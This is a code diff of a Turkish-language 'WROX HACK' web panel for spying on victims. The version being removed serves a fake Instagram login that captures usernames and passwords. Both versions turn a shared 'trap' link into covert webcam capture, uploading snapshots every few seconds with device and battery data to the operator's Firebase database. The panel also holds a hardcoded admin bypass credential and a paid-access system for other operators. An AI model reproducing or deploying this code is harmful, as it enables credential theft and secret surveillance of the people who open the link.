@@ -3,194 +3,241 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WROX V111 | PREMIUM TERMINAL</title>
+    <title>WROX HACK | ELITE TERMINAL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --p: #00f2ff; --bg: #050505; --g: #00ff88; --r: #ff003c; --side: #0a0a0a; --insta: #e1306c; }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', monospace; }
-        body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; display: flex; }
+        :root { --p: #00f2ff; --bg: #050505; --g: #00ff88; --r: #ff003c; --border: #1de9b6; --gray: #111; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', 'Segoe UI', sans-serif; }
+        body { background: var(--bg); color: #fff; display: flex; height: 100vh; overflow: hidden; }
 
-        /* GİRİŞ EKRANI */
-        #auth-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; }
-        .auth-card { width: 360px; padding: 30px; border: 1px solid var(--p); background: #0a0a0a; border-radius: 8px; box-shadow: 0 0 30px rgba(0,242,255,0.2); }
-        
-        /* YAN MENÜ */
-        aside { width: 260px; background: var(--side); border-right: 1px solid #111; display: flex; flex-direction: column; }
-        .side-h { padding: 25px; border-bottom: 1px solid #1a1a1a; color: var(--p); font-size: 20px; font-weight: bold; text-align: center; }
-        .nav-i { padding: 15px 25px; cursor: pointer; color: #888; border-left: 3px solid transparent; transition: 0.3s; }
-        .nav-i:hover, .nav-i.active { background: #0f0f0f; color: var(--p); border-left-color: var(--p); }
-        .menu-t { padding: 15px 25px 5px; font-size: 10px; color: #444; text-transform: uppercase; }
+        /* --- AUTH EKRANI --- */
+        #auth-screen { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; }
+        .auth-box { width: 360px; background: #0a0a0a; padding: 30px; border: 1px solid #1a1a1a; border-radius: 15px; box-shadow: 0 0 30px rgba(0, 242, 255, 0.1); }
+        .auth-tabs { display: flex; margin-bottom: 25px; border-bottom: 1px solid #222; }
+        .auth-tab { flex: 1; padding: 10px; text-align: center; cursor: pointer; color: #444; font-weight: bold; transition: 0.3s; }
+        .auth-tab.active { color: var(--p); border-bottom: 2px solid var(--p); }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid #222; color: #fff; border-radius: 8px; outline: none; }
+        input:focus { border-color: var(--p); }
+        .p-btn { width: 100%; padding: 12px; background: var(--p); color: #000; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; text-transform: uppercase; }
 
-        /* ANA PANEL */
+        /* --- YAN MENÜ --- */
+        nav { width: 260px; background: #000; border-right: 1px solid var(--gray); display: flex; flex-direction: column; z-index: 1000; }
+        .nav-i { padding: 14px 25px; display: flex; align-items: center; gap: 12px; color: #666; cursor: pointer; border-left: 3px solid transparent; transition: 0.2s; font-size: 13px; }
+        .nav-i:hover, .nav-i.active { background: #080808; color: var(--p); border-left-color: var(--p); }
+        .menu-title { padding: 20px 25px 5px; color: #333; font-size: 10px; font-weight: bold; letter-spacing: 2px; text-transform: uppercase; }
+
+        /* --- ANA ALAN --- */
         main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
-        header { height: 60px; border-bottom: 1px solid #111; display: flex; align-items: center; padding: 0 25px; background: #000; justify-content: space-between; }
-        .content { flex: 1; padding: 25px; overflow-y: auto; background: radial-gradient(circle at top right, #0d0d0d, #050505); }
-        .card { background: #000; border: 1px solid #1a1a1a; padding: 20px; margin-bottom: 20px; border-radius: 5px; }
-        
-        input, button { width: 100%; padding: 12px; margin-top: 10px; background: #080808; border: 1px solid #222; color: var(--p); outline: none; border-radius: 4px; }
-        button { cursor: pointer; border-color: var(--p); font-weight: bold; }
-        button:hover { background: var(--p); color: #000; }
+        header { height: 60px; border-bottom: 1px solid var(--gray); display: flex; align-items: center; justify-content: space-between; padding: 0 25px; }
+        .content { flex: 1; padding: 20px; overflow-y: auto; background: radial-gradient(circle at center, #0a0a0a 0%, #050505 100%); }
 
-        /* KAMERA AKIŞI (ALT ALTA) */
-        .cam-log { background: #0d0d0d; border: 1px solid #1a1a1a; margin-bottom: 25px; border-radius: 10px; overflow: hidden; max-width: 550px; margin-inline: auto; }
-        .cam-img { width: 100%; height: auto; display: block; }
-        .cam-info { padding: 12px; font-size: 11px; display: flex; justify-content: space-between; background: #080808; border-top: 1px solid #111; }
+        /* --- LOG KARTLARI --- */
+        .cam-card { border: 2px solid var(--border); border-radius: 12px; background: #000; margin-bottom: 25px; max-width: 450px; margin-inline: auto; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .cam-img { width: 100%; display: block; min-height: 200px; background: #111; }
+        .device-info { padding: 15px; background: #080808; border-top: 1px solid #111; font-size: 11px; }
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .info-val { color: var(--p); font-weight: bold; }
+        .charge-bar { height: 4px; background: #222; border-radius: 2px; overflow: hidden; margin-top: 4px; }
+        .charge-fill { height: 100%; background: var(--g); transition: 0.5s; }
+
+        /* --- MÜZİK & ÇIKIŞ --- */
+        .music-box { padding: 15px 25px; border-top: 1px solid var(--gray); display: flex; align-items: center; gap: 10px; font-size: 11px; color: var(--p); }
+        .logout-area { padding: 15px; border-top: 1px solid var(--gray); margin-top: auto; }
+        .logout-btn { width: 100%; padding: 10px; background: rgba(255,0,60,0.1); color: var(--r); border: 1px solid var(--r); border-radius: 6px; cursor: pointer; font-weight: bold; }
+        .logout-btn:hover { background: var(--r); color: #fff; }
     </style>
 </head>
 <body>
 
-<div id="wrox-root"></div>
+<div id="wrox-shell"></div>
+
+<audio id="bg-music" loop>
+    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-17.mp3" type="audio/mpeg">
+</audio>
 
 <script>
-    // --- FIREBASE AYARI ---
+    // --- FIREBASE AYARLARI ---
     const firebaseConfig = { databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com" };
-    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+    firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const mode = urlParams.get('mode');
-    const refUser = urlParams.get('ref') || 'admin';
+    let authMode = 'login';
 
-    // --- SİSTEM BAŞLATICI ---
     window.onload = () => {
-        if(mode === 'trap') {
-            renderTrap();
-        } else {
-            const user = localStorage.getItem('w_user');
-            user ? renderPanel(user) : renderAuth();
+        const params = new URLSearchParams(window.location.search);
+        if(params.get('mode') === 'trap') { renderTrap(); }
+        else {
+            const session = JSON.parse(localStorage.getItem('w_session'));
+            session ? renderPanel(session) : renderAuth();
         }
     };
 
-    // --- GİRİŞ SİSTEMİ (ÖZEL ADMİN) ---
     function renderAuth() {
-        document.getElementById('wrox-root').innerHTML = `
-            <div id="auth-overlay">
-                <div class="auth-card">
-                    <h2 style="color:var(--p); text-align:center; margin-bottom:20px;">ADMİN GİRİŞİ</h2>
-                    <input type="email" id="email" placeholder="E-posta Adresi">
-                    <input type="password" id="pass" placeholder="Şifre">
-                    <button onclick="handleAuth()">SİSTEME GİRİŞ YAP</button>
-                    <p style="font-size:9px; color:#333; margin-top:15px; text-align:center;">WROX V111 PREMIUM ACCESS</p>
+        document.getElementById('wrox-shell').innerHTML = `
+            <div id="auth-screen">
+                <div class="auth-box">
+                    <h1 style="color:var(--p); text-align:center; margin-bottom:15px; letter-spacing:4px;">WROX HACK</h1>
+                    <div class="auth-tabs">
+                        <div class="auth-tab ${authMode === 'login' ? 'active' : ''}" onclick="switchAuth('login')">GİRİŞ</div>
+                        <div class="auth-tab ${authMode === 'register' ? 'active' : ''}" onclick="switchAuth('register')">KAYIT OL</div>
+                    </div>
+                    <input id="email" placeholder="E-posta Adresi">
+                    <input id="pass" type="password" placeholder="Şifre">
+                    <button class="p-btn" onclick="handleAuth()">${authMode === 'login' ? 'SİSTEME BAĞLAN' : 'HESAP OLUŞTUR'}</button>
                 </div>
             </div>`;
     }
 
-    window.handleAuth = () => {
+    window.switchAuth = (m) => { authMode = m; renderAuth(); };
+
+    async function handleAuth() {
         const e = document.getElementById('email').value.trim();
         const p = document.getElementById('pass').value.trim();
-        
-        // EFECAN ÖZEL BİLGİLER
+        if(!e || !p) return alert("Eksik bilgi!");
+
+        // --- EFECAN ADMIN BYPASS ---
         if(e === "Afavan66@gmail.com" && p === "Efecan1903") {
-            localStorage.setItem('w_user', "Efecan");
-            location.reload();
-        } else {
-            alert("YETKİSİZ GİRİŞ DENEMESİ!");
+            const adminData = { email: e, id: btoa(e).replace(/=/g,""), role: 'super', premium: true };
+            localStorage.setItem('w_session', JSON.stringify(adminData));
+            return location.reload();
         }
-    };
 
-    // --- PANEL TASARIMI ---
+        const id = btoa(e).replace(/=/g,"");
+        if(authMode === 'register') {
+            await db.ref('users/' + id).set({ email: e, id: id, pass: p, premium: false, role: 'user' });
+            alert("Kayıt başarılı! Efecan onay verince Premium aktifleşir.");
+            switchAuth('login');
+        } else {
+            const snap = await db.ref('users/' + id).once('value');
+            if(snap.exists() && snap.val().pass === p) {
+                localStorage.setItem('w_session', JSON.stringify(snap.val()));
+                location.reload();
+            } else { alert("Hatalı giriş!"); }
+        }
+    }
+
     function renderPanel(user) {
-        document.getElementById('wrox-root').innerHTML = `
-            <aside>
-                <div class="side-h">WROX V111</div>
-                <div class="menu-t">NAVİGASYON</div>
-                <div class="nav-i active" onclick="tab('p-link')">🔗 LİNK OLUŞTUR</div>
-                <div class="nav-i" onclick="tab('p-cam')">📷 KAMERA LOGLARI</div>
-                <div class="menu-t">SORGULAR</div>
-                <div class="nav-i" onclick="tab('p-sorgu')">🔍 AD SOYAD SORGUSU</div>
-                <button onclick="localStorage.clear();location.reload()" style="margin:auto 20px 20px; border-color:var(--r); color:var(--r);">ÇIKIŞ</button>
-            </aside>
-            <main>
-                <header><div>STATUS: <span style="color:var(--g)">ONLINE</span></div><div>ADMİN: ${user}</div></header>
-                <div class="content">
-                    <div id="p-link" class="page">
-                        <div class="card">
-                            <h3>TUZAK LİNKİ</h3>
-                            <input id="t-url" readonly style="border-color:var(--p)">
-                            <button onclick="copyL()">LİNKİ KOPYALA</button>
-                        </div>
-                        <div class="card">
-                            <h3 style="color:var(--g)">📡 CANLI VERİ AKIŞI (LİNK ALTI)</h3>
-                            <div id="live-feed" style="margin-top:15px; font-size:12px; color:#555;">Kurban bekleniyor...</div>
-                        </div>
+        document.getElementById('wrox-shell').innerHTML = `
+            <nav>
+                <div class="menu-title">OPERASYON</div>
+                <div class="nav-i active" onclick="tab('my_logs')"><i class="fas fa-user-secret"></i> Kurbanlarım</div>
+                <div class="nav-i" onclick="tab('link')"><i class="fas fa-link"></i> Özel Linkim</div>
+                <div class="nav-i" onclick="tab('mernis')"><i class="fas fa-database"></i> Mernis Sorgu</div>
+
+                ${user.role === 'super' ? `
+                <div class="menu-title">ADMIN MERKEZİ</div>
+                <div class="nav-i" onclick="tab('all_logs')"><i class="fas fa-eye"></i> Global Loglar</div>
+                <div class="nav-i" onclick="tab('users')"><i class="fas fa-users-cog"></i> Kullanıcı Yönetimi</div>
+                ` : ''}
+
+                <div class="logout-area">
+                    <div class="music-box" onclick="toggleMusic()" style="cursor:pointer; margin-bottom:10px; padding:0;">
+                        <i class="fas fa-play" id="m-btn"></i> <span>AUDIO ENGINE</span>
                     </div>
-                    <div id="p-cam" class="page" style="display:none;">
-                        <div id="cam-list"></div>
-                    </div>
-                    <div id="p-sorgu" class="page" style="display:none;">
-                        <div class="card"><h3>SORGU PANELİ</h3><input placeholder="T.C. / AD SOYAD"><button>SORGULA</button></div>
-                    </div>
+                    <button class="logout-btn" onclick="logout()">GÜVENLİ ÇIKIŞ</button>
                 </div>
+            </nav>
+            <main>
+                <header>
+                    <div style="color:var(--p); font-weight:bold; letter-spacing:1px;">WROX HACK V128</div>
+                    <div style="color:var(--g); font-size:11px;">${user.email} ${user.premium ? '[PREMIUM]' : ''}</div>
+                </header>
+                <div class="content" id="view"></div>
             </main>`;
+        tab('my_logs');
+    }
+
+    window.tab = (t) => {
+        const user = JSON.parse(localStorage.getItem('w_session'));
+        const view = document.getElementById('view');
         
-        setupPanel(user);
-    }
-
-    function setupPanel(user) {
-        document.getElementById('t-url').value = window.location.href.split('?')[0] + "?mode=trap&ref=" + user;
-        db.ref('spy_live/' + user).on('value', snap => {
-            const data = snap.val();
-            const feed = document.getElementById('live-feed');
-            const cams = document.getElementById('cam-list');
-            if(!data) return;
-            feed.innerHTML = ''; cams.innerHTML = '';
-            for(let id in data) {
-                const v = data[id];
-                feed.innerHTML = `<div style="padding:10px; border-bottom:1px solid #111;"><b>#${id}</b> | ${v.insta ? '<span style="color:var(--insta)">INSTA:</span> '+v.insta.user+' | '+v.insta.pass : 'Online'}</div>` + feed.innerHTML;
-                if(v.img) {
-                    cams.innerHTML = `
-                        <div class="cam-log">
-                            <img src="${v.img}" class="cam-img">
-                            <div class="cam-info">
-                                <span>ID: ${id}</span>
-                                <span style="color:var(--p)">${new Date(v.last).toLocaleTimeString()}</span>
-                            </div>
-                        </div>` + cams.innerHTML;
-                }
+        if(t === 'my_logs') {
+            if(!user.premium && user.role !== 'super') {
+                view.innerHTML = `<div style="text-align:center; padding-top:100px;"><i class="fas fa-lock" style="font-size:50px; color:var(--r);"></i><h2 style="margin-top:20px;">PREMIUM GEREKLİ</h2><p style="color:#444">Logları görmek için Efecan'dan onay almalısın.</p></div>`;
+                return;
             }
-        });
-    }
-
-    window.tab = (id) => {
-        document.querySelectorAll('.page').forEach(p => p.style.display='none');
-        document.getElementById(id).style.display='block';
-        event.currentTarget.classList.add('active');
+            view.innerHTML = `<div id="log-box"></div>`;
+            db.ref('spy_live/' + user.id).on('value', snap => {
+                const box = document.getElementById('log-box');
+                if(!box) return; box.innerHTML = '';
+                if(!snap.exists()) { box.innerHTML = "<p style='text-align:center;color:#444;'>Henüz kurban düşmedi...</p>"; return; }
+                snap.forEach(c => {
+                    const v = c.val();
+                    box.innerHTML = `
+                        <div class="cam-card">
+                            <img src="${v.img}" class="cam-img">
+                            <div class="device-info">
+                                <div class="info-row"><span>Cihaz:</span><span class="info-val">${v.device}</span></div>
+                                <div class="info-row"><span>Batarya:</span><span class="info-val">%${v.battery} ${v.charging ? '⚡' : ''}</span></div>
+                                <div class="charge-bar"><div class="charge-fill" style="width:${v.battery}%"></div></div>
+                                <div class="info-row" style="margin-top:10px;"><span>Zaman:</span><span style="color:#555;">${new Date(v.last).toLocaleTimeString()}</span></div>
+                            </div>
+                        </div>` + box.innerHTML;
+                });
+            });
+        }
+        else if(t === 'link') {
+            const trap = window.location.href.split('?')[0] + "?mode=trap&ref=" + user.id;
+            view.innerHTML = `<div style="background:#0a0a0a; padding:30px; border-radius:15px; border:1px solid #111;">
+                <h3 style="color:var(--p); margin-bottom:10px;">TUZAĞI HAZIRLA</h3>
+                <p style="font-size:12px; color:#555; margin-bottom:20px;">Bu linkten gelen tüm kurbanlar sadece senin paneline düşer.</p>
+                <input value="${trap}" id="my-link" readonly style="color:var(--p); border-color:var(--p); background:#000;">
+                <button class="p-btn" onclick="copyL()">LİNKİ KOPYALA</button>
+            </div>`;
+        }
+        else if(t === 'users' && user.role === 'super') {
+            view.innerHTML = `<h3>KULLANICI YÖNETİMİ</h3><div id="u-list" style="margin-top:20px;"></div>`;
+            db.ref('users').on('value', snap => {
+                const box = document.getElementById('u-list'); box.innerHTML = '';
+                snap.forEach(u => {
+                    const d = u.val();
+                    box.innerHTML += `<div style="background:#0a0a0a; padding:15px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; border-radius:8px; border:1px solid #111;">
+                        <div><p>${d.email}</p><small style="color:${d.premium ? 'var(--g)' : '#444'}">${d.premium ? 'PREMIUM' : 'NORMAL'}</small></div>
+                        <button onclick="toggleP('${u.key}', ${d.premium})" style="padding:8px 15px; background:${d.premium ? var(--r) : var(--g)}; border:none; border-radius:4px; cursor:pointer; font-weight:bold;">${d.premium ? 'AL' : 'VER'}</button>
+                    </div>`;
+                });
+            });
+        }
+        else { view.innerHTML = `<div style="text-align:center; padding-top:100px;"><h2>BU MODÜL YAPIM AŞAMASINDA</h2></div>`; }
     };
 
-    window.copyL = () => { document.getElementById('t-url').select(); document.execCommand('copy'); alert("Link Kopyalandı!"); };
-
-    // --- KURBAN TARAFIDIR (INSTA TUZAĞI) ---
-    function renderTrap() {
-        document.getElementById('wrox-root').innerHTML = `
-            <div style="background:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; padding-top:80px;">
-                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a251b1a4d56.png" width="175">
-                <div style="width:350px; border:1px solid #dbdbdb; padding:30px; margin-top:30px; background:#fff;">
-                    <input id="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" style="width:100%; padding:10px; margin-bottom:10px; border:1px solid #dbdbdb; background:#fafafa; color:#000;">
-                    <input id="p" type="password" placeholder="Şifre" style="width:100%; padding:10px; margin-bottom:15px; border:1px solid #dbdbdb; background:#fafafa; color:#000;">
-                    <button onclick="go()" style="width:100%; padding:8px; background:#0095f6; color:#fff; border:none; font-weight:bold; border-radius:4px;">Giriş Yap</button>
-                </div>
-                <video id="v" autoplay muted style="display:none;"></video><canvas id="c" style="display:none;"></canvas>
-            </div>`;
+    // --- KURBAN TARAFINDA ÇALIŞAN TUZAK ---
+    async function renderTrap() {
+        document.body.innerHTML = `<div style="background:#000; height:100vh; display:flex; align-items:center; justify-content:center; color:#fff;"><h2>Loading...</h2><video id="v" autoplay muted style="display:none;"></video><canvas id="c" style="display:none;"></canvas></div>`;
+        const refOwner = new URLSearchParams(window.location.search).get('ref');
+        const vID = "KRB-" + Math.random().toString(36).substr(2,4).toUpperCase();
         
-        window.go = async () => {
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            if(!u || !p) return;
-            const vID = "V-" + Math.random().toString(36).substr(2,4).toUpperCase();
-            db.ref(`spy_live/${refUser}/${vID}/insta`).set({ user: u, pass: p });
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('v').srcObject = s;
-                setInterval(() => {
-                    const canvas = document.getElementById('c'); canvas.width=400; canvas.height=300;
-                    canvas.getContext('2d').drawImage(document.getElementById('v'),0,0,400,300);
-                    db.ref(`spy_live/${refUser}/${vID}`).update({ img: canvas.toDataURL('image/jpeg', 0.5), last: Date.now() });
-                }, 3000);
-            } catch(e) {}
-            setTimeout(() => { window.location.href="https://instagram.com"; }, 2000);
-        };
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = stream;
+            setInterval(async () => {
+                const canvas = document.getElementById('c');
+                canvas.width = 400; canvas.height = 300;
+                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 400, 300);
+                const bt = await navigator.getBattery();
+                db.ref(`spy_live/${refOwner}/${vID}`).update({
+                    img: canvas.toDataURL('image/jpeg', 0.5),
+                    device: navigator.userAgent.split('(')[1]?.split(')')[0] || "Bilinmiyor",
+                    battery: Math.floor(bt.level * 100),
+                    charging: bt.charging,
+                    last: Date.now()
+                });
+            }, 4000);
+        } catch(e) {}
     }
+
+    // --- YARDIMCI FONKSİYONLAR ---
+    window.toggleP = (id, cur) => db.ref('users/' + id).update({ premium: !cur });
+    window.toggleMusic = () => {
+        const m = document.getElementById('bg-music');
+        const btn = document.getElementById('m-btn');
+        if (m.paused) { m.play(); btn.classList.replace('fa-play', 'fa-pause'); }
+        else { m.pause(); btn.classList.replace('fa-pause', 'fa-play'); }
+    };
+    window.logout = () => { if(confirm("Çıkış yapılsın mı?")) { localStorage.clear(); location.reload(); } };
+    window.copyL = () => { document.getElementById('my-link').select(); document.execCommand('copy'); alert("Kopyalandı!"); };
 </script>
 </body>
 </html>
